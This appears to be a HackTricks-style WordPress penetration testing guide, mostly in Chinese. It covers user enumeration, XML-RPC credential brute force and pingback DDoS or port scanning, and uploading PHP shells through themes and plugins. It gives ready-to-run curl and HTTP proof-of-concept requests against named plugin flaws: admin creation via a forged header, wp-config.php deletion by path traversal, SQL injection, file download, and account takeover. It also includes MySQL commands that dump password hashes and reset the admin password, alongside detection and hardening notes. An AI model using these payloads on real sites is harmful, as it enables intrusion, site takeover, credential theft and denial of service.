# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

- **Uploaded** 文件存放于: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** 所以如果你修改主题的某些 php 来获取 RCE，你很可能会使用该路径。例如：使用 **theme twentytwelve** 你可以 **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- 在 **wp-config.php** 中你可以找到数据库的 root 密码。
- 默认登录路径可检查: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` 包含有用信息，例如安装的 WordPress 版本。
- `wp-activate.php` 在设置新 WordPress 站点时用于电子邮件激活流程。
- 登录文件夹（可能被重命名以隐藏）:
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` 是一个表示 WordPress 功能的文件，该功能允许以 HTTP 作为传输机制、以 XML 作为编码机制来传输数据。此类通信已被 WordPress 的 [REST API](https://developer.wordpress.org/rest-api/reference) 所取代。
- `wp-content` 文件夹是存放插件和主题的主要目录。
- `wp-content/uploads/` 是平台上上传文件存储的目录。
- `wp-includes/` 是存放核心文件的目录，例如证书、字体、JavaScript 文件和小部件。
- `wp-sitemap.xml` 在 WordPress 5.5 及更高版本中，WordPress 会生成一个包含所有公开帖子和可公开查询的帖子类型与分类法的 sitemap XML 文件。

**Post exploitation**

- `wp-config.php` 文件包含 WordPress 连接数据库所需的信息，例如数据库名、数据库主机、用户名和密码、authentication keys and salts，以及数据库表前缀。该配置文件也可以用于启用 DEBUG 模式，这在排错时很有用。

### Users Permissions

- **Administrator**
- **Editor**: 发布并管理自己与他人的文章
- **Author**: 发布并管理自己的文章
- **Contributor**: 编写并管理自己的文章但不能发布它们
- **Subscriber**: 查看文章并编辑他们的个人资料

## **Passive Enumeration**

### **Get WordPress version**

检查是否能找到文件 `/license.txt` 或 `/readme.html`

在页面的 **源代码** 中（示例来自 [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/））:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS 链接文件

![](<../../images/image (533).png>)

- JavaScript 文件

![](<../../images/image (524).png>)

### 获取插件
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### 获取主题
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### 提取版本信息（通用）
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## 主动枚举

### 插件和主题

你可能无法找到所有插件和主题。为了发现它们，你需要**主动对插件和主题列表进行 Brute Force**（希望有自动化工具包含这些列表）。

### 用户

- **ID Brute:** 通过 Brute Forcing 用户 ID，可从 WordPress 站点获取有效用户：
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
如果响应为 **200** 或 **30X**，则表示该 id 是 **有效的**。如果响应为 **400**，则该 id **无效**。

- **wp-json:** 你还可以尝试通过查询来获取有关用户的信息：
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
另一个会显示一些用户信息的 `/wp-json/` 端点是：
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
注意，该端点仅会暴露曾发表过文章的用户。**仅会提供启用了此功能的用户的信息**。

另请注意，**/wp-json/wp/v2/pages** 可能会 leak IP 地址。

- **Login username enumeration**: 在通过 **`/wp-login.php`** 登录时，**消息** 会 **不同**，用以指示 **用户名是否存在**。

### XML-RPC

如果 `xml-rpc.php` 启用，你可以执行 credentials brute-force，或利用它对其他资源发起 DoS attacks。（例如，你可以自动化此过程[ using this](https://github.com/relarizky/wpxploit)）。

要检查它是否启用，尝试访问 _**/xmlrpc.php**_ 并发送以下请求：

**检查**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** 是一些可以用来 brute-force credentials 的方法。如果你能找到其中任何一个，你可以发送如下内容：
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
如果凭证无效，则在 200 响应中应出现消息 _"Incorrect username or password"_。

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../..//images/image (721).png>)

使用正确的凭证可以上传文件。在响应中会出现该路径 ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
另外，有一种 **更快的方式** 使用 **`system.multicall`** 对凭证进行暴力破解，因为你可以在同一个请求中尝试多个凭证：

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**绕过 2FA**

此方法是为程序而非人工交互设计的，且较为古老，因此不支持 2FA。  
因此，如果你有有效的 creds 但主入口受 2FA 保护，**你可能能够滥用 xmlrpc.php 使用这些 creds 登录，从而绕过 2FA**。注意，你无法执行通过控制台能做的所有操作，但你仍可能达到 RCE，正如 Ippsec 在 [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) 中解释的那样。

**DDoS 或端口扫描**

如果你能在方法列表中找到 _**pingback.ping**_，你可以让 Wordpress 向任意主机/端口发送任意请求。\
这可以用来让 **成千上万** 的 Wordpress **站点** 去 **访问** 同一 **地址**（从而在该处触发 **DDoS**），或者用来让 **Wordpress** 去 **扫描** 某些内部 **网络**（你可以指定任意端口）。
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

如果你得到 **faultCode** 值大于 **0**（17），则表示端口是开放的。

查看前一节中对 **`system.multicall`** 的用法，学习如何滥用此方法来造成 DDoS。

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

该文件通常存在于 Wordpress 站点的根目录：**`/wp-cron.php`**\
当此文件被**访问**时，会执行一次**“重”** MySQL **查询**，因此**攻击者**可以利用它**导致** **DoS**。\
此外，默认情况下，`wp-cron.php` 会在每次页面加载时被调用（任何客户端请求任何 Worpress 页面时），在高流量站点上可能导致问题（DoS）。

建议禁用 Wp-Cron，并在主机内创建一个真实的 cronjob，以定期执行所需操作（避免引发问题）。

### /wp-json/oembed/1.0/proxy - SSRF

尝试访问 _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_，Worpress 站点可能会向你发起请求。

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

该工具会检查是否存在 **methodName: pingback.ping** 以及路径 **/wp-json/oembed/1.0/proxy**，如果存在，则尝试利用它们。

## 自动化工具
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## 通过覆盖一位获取访问权限

这更多是个好奇的例子，而不是真正的攻击。在 CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) 中，你可以翻转任意 wordpress 文件的 1 bit。所以你可以翻转文件 `/var/www/html/wp-includes/user.php` 的位置 `5389`，以 NOP 掉 NOT (`!`) 操作。
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **面板 RCE**

**修改所用主题中的 php（需要 admin 凭证）**

外观 → 主题编辑器 → 404 Template（在右侧）

将内容更改为 php shell：

![](<../../images/image (384).png>)

在互联网上搜索如何访问该已更新页面。在本例中，你需要访问： [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

你可以使用：
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
以获取会话。

## Plugin RCE

### PHP plugin

可能可以将 .php 文件作为 plugin 上传。\
创建你的 php backdoor，例如使用：

![](<../../images/image (183).png>)

然后添加一个新的 plugin：

![](<../../images/image (722).png>)

Upload plugin 并按 Install Now：

![](<../../images/image (249).png>)

点击 Procced：

![](<../../images/image (70).png>)

这看起来可能不会有任何反应，但如果你转到 Media，你会看到上传的 shell：

![](<../../images/image (462).png>)

访问它，你会看到用于执行 reverse shell 的 URL：

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

该方法涉及安装已知存在漏洞的恶意 plugin，并可被利用以获取 web shell。该过程通过 WordPress dashboard 执行，步骤如下：

1. **Plugin Acquisition**: 从诸如 Exploit DB 的来源获取该 plugin，例如 [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- 导航到 WordPress dashboard，然后进入 `Dashboard > Plugins > Upload Plugin`。
- 上传下载的 plugin 的 zip 文件。
3. **Plugin Activation**: plugin 安装成功后，必须通过 dashboard 激活。
4. **Exploitation**:
- 安装并激活 reflex-gallery plugin 后，由于其已知存在漏洞，可以对其进行利用。
- Metasploit framework 为该漏洞提供了 exploit。通过加载相应模块并执行特定命令，可建立 meterpreter 会话，从而获取对站点的未授权访问。
- 请注意，这只是利用 WordPress 站点的众多方法之一。

内容包括展示在 WordPress 仪表盘中安装和激活 plugin 步骤的图示。不过需要注意的是，在没有适当授权的情况下以这种方式利用漏洞是非法且不道德的。该信息应负责任地使用，并仅在合法情境下，例如具有明确许可的 penetration testing 时使用。

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## 从 XSS 到 RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ 是一个脚本，旨在将 **Cross-Site Scripting (XSS)** 漏洞升级为 **Remote Code Execution (RCE)** 或其他 WordPress 的严重漏洞。更多信息请查看 [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)。它提供对 Wordpress 6.X.X、5.X.X 和 4.X.X 版本的支持，并允许：
- _**Privilege Escalation:**_ 在 WordPress 中创建一个用户。
- _**(RCE) Custom Plugin (backdoor) Upload:**_ 将你的自定义 plugin (backdoor) 上传到 WordPress。
- _**(RCE) Built-In Plugin Edit:**_ 编辑 WordPress 内置的 plugin。
- _**(RCE) Built-In Theme Edit:**_ 编辑 WordPress 内置的 theme。
- _**(Custom) Custom Exploits:**_ 为第三方 WordPress plugins/themes 提供自定义 exploits。

## Post Exploitation

提取用户名和密码：
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
更改 admin 密码:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress 插件 Pentest

### 攻击面

了解 Wordpress 插件如何暴露功能是发现其功能性漏洞的关键。你可以在下面的要点中看到插件可能如何暴露功能，以及一些易受攻击插件的示例，详见 [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

插件暴露给用户功能的方式之一是通过 AJAX 处理程序。这些处理程序可能包含逻辑、授权或认证漏洞。此外，这类函数很常见地将认证和授权都基于 wordpress nonce 的存在，而 **任何在该 Wordpress 实例中已验证的用户都可能拥有**（与其角色无关）。

下面是可用于在插件中暴露功能的函数：
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**使用 `nopriv` 会使该 endpoint 可被任何用户访问（甚至未认证的用户）。**

> [!CAUTION]
> 此外，如果函数只是使用 `wp_verify_nonce` 来检查用户的授权，该函数通常只是检查用户是否已登录，并不会检查用户的角色。因此低权限用户可能能够访问高权限操作。

- **REST API**

也可以通过在 WordPress 中使用 `register_rest_route` 函数注册 REST API 来公开函数：
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` is a callback to function that checks if a given user is authorized to call the API method.

**If the built-in `__return_true` function is used, it'll simply skip user permissions check.**

- **直接访问 php 文件**

当然，Wordpress 使用 PHP，插件内部的文件可以从 web 直接访问。因此，如果某个插件暴露了仅需访问该文件即可触发的易受攻击功能，那么任何用户都可以利用它。

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

一些插件为内部集成或反向代理实现了“trusted header”快捷方式，然后使用该 header 为 REST 请求设置当前用户上下文。如果该 header 未被上游组件以加密方式绑定到请求，攻击者就可以伪造它并以管理员身份访问有权限的 REST 路由。

- Impact: 未认证的权限提升到 admin，通过核心 users REST 路由创建新的管理员。
- Example header: `X-Wcpay-Platform-Checkout-User: 1`（强制 user ID 1，通常是第一个管理员帐号）。
- Exploited route: `POST /wp-json/wp/v2/users`，使用提升的 role 数组。

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
为什么它有效

- 该插件将客户端可控的 header 映射到认证状态，并跳过 capability checks。
- WordPress core 期望此路由具有 `create_users` capability；该插件利用此点，通过直接从 header 设置当前用户上下文来绕过它。

预期成功指标

- 返回 HTTP 201，且响应体为描述已创建用户的 JSON。
- 在 `wp-admin/users.php` 中可见一个新的管理员用户。

检测清单

- Grep for `getallheaders()`, `$_SERVER['HTTP_...']`, or vendor SDKs that read custom headers to set user context (e.g., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- 审查 REST 注册，查找缺乏健壮 `permission_callback` 检查、且依赖请求 header 的特权回调。
- 查找在 REST 处理器内仅以 header 值为门控的核心用户管理函数 (`wp_insert_user`, `wp_create_user`) 的使用。

### 通过 wp_ajax_nopriv 的未经认证任意文件删除 (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. 一个 **capability check**（例如 `current_user_can()` 或至少 `is_user_logged_in()`），以及
2. 一个通过 `check_ajax_referer()` / `wp_verify_nonce()` 验证的 **CSRF nonce**，以及
3. **严格的输入消毒/验证**。

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
* **未经身份验证的访问** – 已注册 `wp_ajax_nopriv_` 钩子。
* **No nonce / capability check** – 任何访客都可以访问该端点。
* **No path sanitisation** – 用户可控的 `fontfamily` 字符串在未过滤的情况下被拼接到文件系统路径中，允许经典的 `../../` 目录遍历。

#### 利用

攻击者可以通过发送一个 HTTP POST 请求，删除位于 **uploads 基目录以下** 的任意文件或目录（通常是 `<wp-root>/wp-content/uploads/`）：
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
因为 `wp-config.php` 位于 *uploads* 之外，默认安装中四个 `../` 就足够了。删除 `wp-config.php` 会在下一次访问时强制 WordPress 进入 *安装向导*，从而允许完全接管站点（攻击者只需提供新的 DB 配置并创建一个管理员用户）。

其他有影响的目标包括插件/主题的 `.php` 文件（用于破坏安全插件）或 `.htaccess` 规则。

#### 检测清单

* 任何调用文件系统辅助函数（`copy()`, `unlink()`, `$wp_filesystem->delete()` 等）的 `add_action( 'wp_ajax_nopriv_...')` 回调。
* 将未经过滤的用户输入串联进路径（查找 `$_POST`, `$_GET`, `$_REQUEST`）。
* 缺少 `check_ajax_referer()` 和 `current_user_can()`/`is_user_logged_in()`。

---

### 通过过时角色恢复和缺失授权进行的权限提升 (ASE "View Admin as Role")

许多插件通过在 user meta 中保存原始角色以实现 "view as role" 或临时角色切换功能，以便之后还原。如果还原流程仅依赖请求参数（例如 `$_REQUEST['reset-for']`）和插件维护的列表，而没有检查 capabilities 和有效的 nonce，这就会成为一次垂直权限提升。

在实际案例中，Admin and Site Enhancements (ASE) 插件（≤ 7.6.2.1）存在此问题。reset 分支在内部数组 `$options['viewing_admin_as_role_are']` 中出现该用户名时，会根据 `reset-for=<username>` 恢复角色，但在移除当前角色并从 user meta `_asenha_view_admin_as_original_roles` 重新添加已保存角色之前，既没有执行 `current_user_can()` 检查，也没有进行 nonce 验证：
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
为什么可被利用

- 信任 `$_REQUEST['reset-for']` 和一个插件选项，而没有进行服务端授权。
- 如果某用户之前在 `_asenha_view_admin_as_original_roles` 中保存了更高权限并被降级，他们可以通过访问重置路径恢复这些权限。
- 在某些部署中，任何已认证用户都可以为仍存在于 `viewing_admin_as_role_are` 的另一个用户名触发重置（授权缺陷）。

利用（示例）
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
在易受攻击的构建中，这会移除当前角色并重新添加已保存的原始角色（例如 `administrator`），从而实现权限提升。

检测清单

- 查找在 user meta 中持久化 “original roles” 的角色切换功能（例如 `_asenha_view_admin_as_original_roles`）。
- 识别重置/还原路径，这些路径：
- 从 `$_REQUEST` / `$_GET` / `$_POST` 读取用户名。
- 通过 `add_role()` / `remove_role()` 修改角色，而没有使用 `current_user_can()` 和 `wp_verify_nonce()` / `check_admin_referer()`。
- 基于插件选项数组（例如 `viewing_admin_as_role_are`）进行授权，而不是基于操作者的能力。

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

一些插件将用户切换辅助函数挂到公共的 `init` hook，并从客户端可控的 cookie 中推断身份。如果代码在未验证身份、能力和有效 nonce 的情况下调用 `wp_set_auth_cookie()`，任何未认证的访问者都可以强制以任意用户 ID 登录。

Typical vulnerable pattern (simplified from Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
为何可被利用

- 公共的 `init` hook 使得该处理程序对未认证的用户可达（没有 `is_user_logged_in()` 保护）。
- 身份来自于可由客户端修改的 cookie（`original_user_id`）。
- 对 `wp_set_auth_cookie($uid)` 的直接调用会将请求者以该用户身份登录，而不会进行任何 capability/nonce 检查。

利用（无需身份验证）
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF 对 WordPress/plugin CVEs 的考虑

通用的 edge/server WAFs 针对广泛模式（SQLi, XSS, LFI）进行调优。许多高危的 WordPress/plugin 漏洞是特定于应用的逻辑/认证缺陷，除非检测引擎理解 WordPress 路由和 plugin 语义，否则这些请求看起来像正常流量。

攻击提示

- 针对 plugin 特定端点使用干净的 payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- 先测试未认证路径（AJAX `nopriv`, REST 中带宽松的 `permission_callback`, 公开 shortcodes）。默认 payloads 往往在不做混淆的情况下就能成功。
- 常见的高危情况：权限提升（broken access control）、任意文件上传/下载、LFI、open redirect。

防御提示

- 不要依赖通用 WAF 签名来保护 plugin CVEs。应实施应用层、针对具体漏洞的虚拟补丁，或尽快更新。
- 在代码中优先使用正向安全检查（capabilities、nonces、严格的输入验证），而不是基于否定的 regex 过滤。

## WordPress Protection

### Regular Updates

确保 WordPress、plugins 和 themes 已更新到最新版本。还要确认在 wp-config.php 中启用了自动更新：
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
此外，**仅安装可信的 WordPress 插件和主题**。

### 安全插件

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **其他建议**

- 移除默认的 **admin** 用户
- 使用 **强密码** 和 **2FA**
- 定期 **审查** 用户 **权限**
- **限制登录尝试** 以防止 Brute Force 攻击
- 重命名 **`wp-admin.php`** 文件，并仅允许内部或特定 IP 地址访问。


### 未经身份验证的 SQL Injection（由于验证不足）（WP Job Portal <= 2.3.2）

WP Job Portal 招聘插件暴露了一个 **savecategory** 任务，最终在 `modules/category/model.php::validateFormData()` 中执行了以下易受攻击的代码：
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
此片段引入的问题：

1. **未清理的用户输入** – `parentid` 直接来自 HTTP 请求。
2. **WHERE 子句中的字符串拼接** – 没有使用 `is_numeric()` / `esc_sql()` / prepared statement。
3. **无需认证即可访问** – 虽然该 action 通过 `admin-post.php` 执行，但唯一的检查是 **CSRF nonce**（`wp_verify_nonce()`），任何访问者都可以从嵌入了短代码 `[wpjobportal_my_resumes]` 的公共页面获取到。

#### 利用

1. 获取一个新的 nonce：
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. 通过滥用 `parentid` 注入任意 SQL：
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
响应会返回注入查询的结果或修改数据库，从而证明存在 SQLi。


### 未认证的任意文件下载 / 路径遍历 (WP Job Portal <= 2.3.2)

另一个任务 **downloadcustomfile** 允许访问者通过路径遍历下载磁盘上的 **任意文件**。易受攻击的 sink 位于 `modules/customfield/model.php::downloadCustomUploadedFile()`：
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` 是 attacker-controlled 并在拼接时 **未经过清理**。再次，唯一的门槛是一个 **CSRF nonce**，可以从简历页面获取。

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
The server responds with the contents of `wp-config.php`, leaking DB credentials and auth keys.

## 未经身份验证的账户接管通过 Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

许多主题/插件通过 admin-ajax.php 暴露“social login”辅助程序。如果一个未经身份验证的 AJAX 动作 (wp_ajax_nopriv_...) 在提供者数据缺失时信任客户端提供的标识符，并随后调用 wp_set_auth_cookie()，就会导致完全的身份验证绕过。

典型的有缺陷的模式（简化）
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider – execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // 🔥 logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
为何可被利用

- 可在未认证情况下通过 admin-ajax.php（wp_ajax_nopriv_… action）访问。
- 在状态更改之前没有 nonce/capability checks。
- 缺少 OAuth/OpenID provider 验证；默认分支接受攻击者输入。
- get_user_by('email', $_POST['id']) 随后调用 wp_set_auth_cookie($uid) 会将请求者认证为任意存在的邮箱地址。

利用（未认证）

- 先决条件：攻击者能够访问 /wp-admin/admin-ajax.php 并知道/猜测有效的用户邮箱。
- 将 provider 设置为不受支持的值（或省略）以触发默认分支并传递 id=<victim_email>。
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
预期成功指标

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web 日志显示未经身份验证的 POST 请求到 /wp-admin/admin-ajax.php，带有 social-login action 和 id=<email>。
- 从相同 IP/User-Agent 紧接出现成功 JSON 的 200 响应，随后出现已认证流量。

Hardening

- 不要从客户端输入推导身份。只接受来源于已验证 provider token/ID 的电子邮箱/ID。
- 即便是 login helpers，也要要求 CSRF nonces 和 capability checks；除非绝对必要，否则避免注册 wp_ajax_nopriv_。
- 在服务器端验证和校验 OAuth/OIDC 响应；拒绝缺失/无效的 providers（不要回退到 POST id）。
- 考虑暂时禁用 social login 或在边缘进行虚拟打补丁（阻断易受攻击的 action），直到修复。

Patched behaviour (Jobmonster 4.8.0)

